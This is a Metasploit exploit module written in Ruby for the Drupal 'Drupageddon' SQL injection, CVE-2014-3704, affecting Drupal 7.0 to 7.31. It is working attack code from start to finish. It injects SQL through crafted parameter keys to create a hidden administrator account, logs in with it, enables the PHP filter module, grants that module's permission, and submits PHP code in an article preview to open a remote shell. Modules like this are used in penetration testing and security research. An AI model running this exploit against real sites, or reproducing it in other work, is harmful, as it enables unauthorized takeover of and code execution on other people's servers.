# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Drupal HTTP Parameter Key/Value SQL Injection&#039;,
      &#039;Description&#039;    => %q{
        This module exploits the Drupal HTTP Parameter Key/Value SQL Injection
        (aka Drupageddon) in order to achieve a remote shell on the vulnerable
        instance. This module was tested against Drupal 7.0 and 7.31 (was fixed
        in 7.32).
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;SektionEins&#039;,          # discovery
          &#039;Christian Mehlmauer&#039;,  # msf module
          &#039;Brandon Perry&#039;         # msf module
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2014-3704&#039;],
          [&#039;URL&#039;, &#039;https://www.drupal.org/SA-CORE-2014-005&#039;],
        ],
      &#039;Privileged&#039;     => false,
      &#039;Platform&#039;       => [&#039;php&#039;],
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        => [[&#039;Drupal 7.0 - 7.31&#039;,{}]],
      &#039;DisclosureDate&#039; => &#039;Oct 15 2014&#039;,
      &#039;DefaultTarget&#039;  => 0
    ))

    register_options(
    [
      OptString.new(&#039;TARGETURI&#039;, [ true, "The target URI of the Drupal installation", &#039;/&#039;])
    ], self.class)

    register_advanced_options(
    [
      OptString.new(&#039;ADMIN_ROLE&#039;, [ true, "The administrator role", &#039;administrator&#039;]),
      OptInt.new(&#039;ITER&#039;, [ true, "Hash iterations (2^ITER)", 10])
    ], self.class)
  end

  def uri_path
    normalize_uri(target_uri.path)
  end

  def admin_role
    datastore[&#039;ADMIN_ROLE&#039;]
  end

  def iter
    datastore[&#039;ITER&#039;]
  end

  def itoa64
    &#039;./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#039;
  end

  # PHPs PHPASS base64 method
  def phpass_encode64(input, count)
    out = &#039;&#039;
    cur = 0
    while cur < count
      value = input[cur].ord
      cur += 1
      out << itoa64[value & 0x3f]
      if cur < count
        value |= input[cur].ord << 8
      end
      out << itoa64[(value >> 6) & 0x3f]
      break if cur >= count
      cur += 1

      if cur < count
        value |= input[cur].ord << 16
      end
      out << itoa64[(value >> 12) & 0x3f]
      break if cur >= count
      cur += 1
      out << itoa64[(value >> 18) & 0x3f]
    end
    out
  end

  def generate_password_hash(pass)
    # Syntax for MD5:
    # $P$ = MD5
    # 8 chars salt
    # MD5_raw(salt.pass) + iterations
    # MD5 phpass base64 encoded (!= encode_base64) and trimmed to 22 chars for md5
    iter_char = itoa64[iter]
    salt = Rex::Text.rand_text_alpha(8)
    md5 = Rex::Text.md5_raw("#{salt}#{pass}")
    # convert iter from log2 to integer
    iter_count = 2**iter
    1.upto(iter_count) {
      md5 = Rex::Text.md5_raw("#{md5}#{pass}")
    }
    md5_base64 = phpass_encode64(md5, md5.length)
    md5_stripped = md5_base64[0...22]
    pass = "$P\\$" + iter_char + salt + md5_stripped
    vprint_debug("#{peer} - password hash: #{pass}")

    return pass
  end

  def sql_insert_user(user, pass)
    "insert into users (uid, name, pass, mail, status) select max(uid)+1, &#039;#{user}&#039;, &#039;#{generate_password_hash(pass)}&#039;, &#039;#{Rex::Text.rand_text_alpha_lower(5)}@#{Rex::Text.rand_text_alpha_lower(5)}.#{Rex::Text.rand_text_alpha_lower(3)}&#039;, 1 from users"
  end

  def sql_make_user_admin(user)
    "insert into users_roles (uid, rid) VALUES ((select uid from users where name=&#039;#{user}&#039;), (select rid from role where name = &#039;#{admin_role}&#039;))"
  end

  def extract_form_ids(content)
    form_build_id = $1 if content =~ /name="form_build_id" value="(.+)" \/>/
    form_token = $1 if content =~ /name="form_token" value="(.+)" \/>/

    vprint_debug("#{peer} - form_build_id: #{form_build_id}")
    vprint_debug("#{peer} - form_token: #{form_token}")

    return form_build_id, form_token
  end

  def exploit

    # TODO: Check if option admin_role exists via admin/people/permissions/roles

    # call login page to extract tokens
    print_status("#{peer} - Testing page")
    res = send_request_cgi({
      &#039;uri&#039; => uri_path,
      &#039;vars_get&#039; => {
        &#039;q&#039; => &#039;user/login&#039;
      }
    })

    unless res and res.body
      fail_with(Failure::Unknown, "No response or response body, bailing.")
    end

    form_build_id, form_token = extract_form_ids(res.body)

    user = Rex::Text.rand_text_alpha(10)
    pass = Rex::Text.rand_text_alpha(10)

    post = {
      "name[0 ;#{sql_insert_user(user, pass)}; #{sql_make_user_admin(user)}; # ]" => Rex::Text.rand_text_alpha(10),
      &#039;name[0]&#039; => Rex::Text.rand_text_alpha(10),
      &#039;pass&#039; => Rex::Text.rand_text_alpha(10),
      &#039;form_build_id&#039; => form_build_id,
      &#039;form_id&#039; => &#039;user_login&#039;,
      &#039;op&#039; => &#039;Log in&#039;
    }

    print_status("#{peer} - Creating new user #{user}:#{pass}")
    res = send_request_cgi({
      &#039;uri&#039; => uri_path,
      &#039;method&#039; => &#039;POST&#039;,
      &#039;vars_post&#039; => post,
      &#039;vars_get&#039; => {
        &#039;q&#039; => &#039;user/login&#039;
      }
    })

    unless res and res.body
      fail_with(Failure::Unknown, "No response or response body, bailing.")
    end

    # login
    print_status("#{peer} - Logging in as #{user}:#{pass}")
    res = send_request_cgi({
      &#039;uri&#039; => uri_path,
      &#039;method&#039; => &#039;POST&#039;,
      &#039;vars_post&#039; => {
        &#039;name&#039; => user,
        &#039;pass&#039; => pass,
        &#039;form_build_id&#039; => form_build_id,
        &#039;form_id&#039; => &#039;user_login&#039;,
        &#039;op&#039; => &#039;Log in&#039;
      },
      &#039;vars_get&#039; => {
        &#039;q&#039; => &#039;user/login&#039;
      }
    })

    unless res and res.code == 302
      fail_with(Failure::Unknown, "No response or response body, bailing.")
    end

    cookie = res.get_cookies
    vprint_debug("#{peer} - cookie: #{cookie}")

    # call admin interface to extract CSRF token and enabled modules
    print_status("#{peer} - Trying to parse enabled modules")
    res = send_request_cgi({
      &#039;uri&#039; => uri_path,
      &#039;vars_get&#039; => {
        &#039;q&#039; => &#039;admin/modules&#039;
      },
      &#039;cookie&#039; => cookie
    })

    form_build_id, form_token = extract_form_ids(res.body)

    enabled_module_regex = /name="(.+)" value="1" checked="checked" class="form-checkbox"/
    enabled_matches = res.body.to_enum(:scan, enabled_module_regex).map { Regexp.last_match }

    unless enabled_matches
      fail_with(Failure::Unknown, "No modules enabled is incorrect, bailing.")
    end

    post = {
      &#039;modules[Core][php][enable]&#039; => &#039;1&#039;,
      &#039;form_build_id&#039; => form_build_id,
      &#039;form_token&#039; => form_token,
      &#039;form_id&#039; => &#039;system_modules&#039;,
      &#039;op&#039; => &#039;Save configuration&#039;
    }

    enabled_matches.each do |match|
      post[match.captures[0]] = &#039;1&#039;
    end

    # enable PHP filter
    print_status("#{peer} - Enabling the PHP filter module")
    res = send_request_cgi({
      &#039;uri&#039; => uri_path,
      &#039;method&#039; => &#039;POST&#039;,
      &#039;vars_post&#039; => post,
      &#039;vars_get&#039; => {
        &#039;q&#039; => &#039;admin/modules/list/confirm&#039;
      },
      &#039;cookie&#039; => cookie
    })

    unless res and res.body
      fail_with(Failure::Unknown, "No response or response body, bailing.")
    end

    # Response: http 302, Location: http://10.211.55.50/?q=admin/modules

    print_status("#{peer} - Setting permissions for PHP filter module")

    # allow admin to use php_code
    res = send_request_cgi({
      &#039;uri&#039; => uri_path,
      &#039;vars_get&#039; => {
        &#039;q&#039; => &#039;admin/people/permissions&#039;
      },
      &#039;cookie&#039; => cookie
    })


    unless res and res.body
      fail_with(Failure::Unknown, "No response or response body, bailing.")
    end

    form_build_id, form_token = extract_form_ids(res.body)

    perm_regex = /name="(.*)" value="(.*)" checked="checked"/
    enabled_perms = res.body.to_enum(:scan, perm_regex).map { Regexp.last_match }

    unless enabled_perms
      fail_with(Failure::Unknown, "No enabled permissions were able to be parsed, bailing.")
    end

    # get administrator role id
    id = $1 if res.body =~ /for="edit-([0-9]+)-administer-content-types">#{admin_role}:/
    vprint_debug("#{peer} - admin role id: #{id}")

    unless id
      fail_with(Failure::Unknown, "Could not parse out administrator ID")
    end

    post = {
      "#{id}[use text format php_code]" => &#039;use text format php_code&#039;,
      &#039;form_build_id&#039; => form_build_id,
      &#039;form_token&#039; => form_token,
      &#039;form_id&#039; => &#039;user_admin_permissions&#039;,
      &#039;op&#039; => &#039;Save permissions&#039;
    }

    enabled_perms.each do |match|
      post[match.captures[0]] = match.captures[1]
    end

    res = send_request_cgi({
      &#039;uri&#039; => uri_path,
      &#039;method&#039; => &#039;POST&#039;,
      &#039;vars_post&#039; => post,
      &#039;vars_get&#039; => {
        &#039;q&#039; => &#039;admin/people/permissions&#039;
      },
      &#039;cookie&#039; => cookie
    })

    unless res and res.body
      fail_with(Failure::Unknown, "No response or response body, bailing.")
    end

    # Add new Content page (extract csrf token)
    print_status("#{peer} - Getting tokens from create new article page")
    res = send_request_cgi({
      &#039;uri&#039; => uri_path,
      &#039;vars_get&#039; => {
        &#039;q&#039; => &#039;node/add/article&#039;
      },
      &#039;cookie&#039; => cookie
    })

    unless res and res.body
      fail_with(Failure::Unknown, "No response or response body, bailing.")
    end

    form_build_id, form_token = extract_form_ids(res.body)

    # Preview to trigger the payload
    data = Rex::MIME::Message.new
    data.add_part(Rex::Text.rand_text_alpha(10), nil, nil, &#039;form-data; name="title"&#039;)
    data.add_part(form_build_id, nil, nil, &#039;form-data; name="form_build_id"&#039;)
    data.add_part(form_token, nil, nil, &#039;form-data; name="form_token"&#039;)
    data.add_part(&#039;article_node_form&#039;, nil, nil, &#039;form-data; name="form_id"&#039;)
    data.add_part(&#039;php_code&#039;, nil, nil, &#039;form-data; name="body[und][0][format]"&#039;)
    data.add_part("<?php #{payload.encoded} ?>", nil, nil, &#039;form-data; name="body[und][0][value]"&#039;)
    data.add_part(&#039;Preview&#039;, nil, nil, &#039;form-data; name="op"&#039;)
    data.add_part(user, nil, nil, &#039;form-data; name="name"&#039;)
    data.add_part(&#039;1&#039;, nil, nil, &#039;form-data; name="status"&#039;)
    data.add_part(&#039;1&#039;, nil, nil, &#039;form-data; name="promote"&#039;)
    post_data = data.to_s

    send_request_cgi(
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;uri&#039;      => uri_path,
      &#039;ctype&#039;    => "multipart/form-data; boundary=#{data.bound}",
      &#039;data&#039;     => post_data,
      &#039;vars_get&#039; => {
        &#039;q&#039; => &#039;node/add/article&#039;
      },
      &#039;cookie&#039; => cookie
    )
  end
end

